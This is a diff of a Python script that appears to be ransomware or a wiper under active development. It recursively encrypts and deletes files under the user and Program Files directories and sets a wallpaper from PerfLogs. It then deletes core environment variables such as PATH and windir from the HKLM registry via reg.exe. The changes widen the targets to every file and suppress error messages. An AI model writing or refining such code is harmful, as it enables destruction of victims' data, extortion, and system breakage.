@@ -30,15 +30,15 @@ def file_ecrypt(key, name):
 
             os.remove(name)
         except:
-            print("Error: Not Permitted")
+            pass
 
 path = os.getcwd()
 img = "\setup\image.jpg"
 Wallpaper = "%s%s" %(path, img)
-filePath = shutil.copy(Wallpaper, 'c:\\PerfLogs\\image.jpg')
+filePath = shutil.copy(Wallpaper, '\\PerfLogs\\image.jpg')
 # WALLPAPER SETTINGS
 SPI_SETDESKWALLPAPER = 20
-WALLPAPER_PATH = 'c:\\PerfLogs\\image.jpg'
+WALLPAPER_PATH = '\\PerfLogs\\image.jpg'
 
 def is_64_windows():
     """Find out how many bits is OS. """
@@ -56,43 +56,37 @@ def change_wallpaper():
         print(ctypes.WinError())
 #LIST ALL FILES FOR PARTICULAR FILE EXTENTIONS AND INVOKE FILE ENCTYPT FUNCTION.
 def filelist():
-    mylist = ["contact",".mpeg",".wma",".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4","dll","exe","bmp",".rtf"]
-    spec = "c:/users/"
-    for root, dirs, files in os.walk(spec):
-        for file in files:
-            for ext in mylist:
-                if file.endswith(ext):
-                    ally = os.path.join(root, file)
-                    print(ally)
-                    file_ecrypt(key, ally)
-    spec2 = "c:/Program Files (x86)/"
-    for root, dirs, files in os.walk(spec2):
-        for file in files:
-            for ext in mylist:
-                if file.endswith(ext):
-                    ally = os.path.join(root, file)
-                    print(ally)
-                    file_ecrypt(key, ally)
+    spec = ['/users/', '/Program Files (x86)/', '/Program Files/']
+    for i in spec:
+        for root, dirs, files in os.walk(i):
+            for file in files:
+                for ext in file.split("."):
+                    try:
+                        if file.endswith(ext):
+                            ally = os.path.join(root, file)
+                            print(ally)
+                            file_ecrypt(key, ally)
+                    except PermissionError:
+                        pass
 filelist()
-time.sleep(2)
 change_wallpaper()
 # ENCRYPT THE FOLDER CONTAINS THE WALLPAPER
 def filelist_aux():
-    mylist = ["jpg","png","log"]
-    spec = "c:/PerfLogs/"
+    spec = "/PerfLogs/"
     for root, dirs, files in os.walk(spec):
         for file in files:
-            for ext in mylist:
+            for ext in file.split("."):
                 if file.endswith(ext):
                     ally = os.path.join(root, file)
                     print(ally)
                     file_ecrypt(key, ally)
+time.sleep(2)
 filelist_aux()
 # FUNCTION TO DELETE A SPECIAL REG ENVIRONMENT IN THE REGISTER
 def delSpecRules():
     regs = ['TEMP', 'USERNAME', 'windir', 'OS', 'PATHEXT', 'PATH', 'PSModulePath']
     for reg in regs:
-        cmd = 'c:/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
+        cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
         os.system(cmd)
         time.sleep(2)
 delSpecRules()
@@ -103,9 +97,8 @@ def delRules():
         try:
             keyname = winreg.EnumValue(aKey, keys)
             key, value, id = (keyname)
-            cmd = 'c:/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
+            cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
             os.system(cmd)
-            time.sleep(2)
         except OSError:
             pass
 delRules()
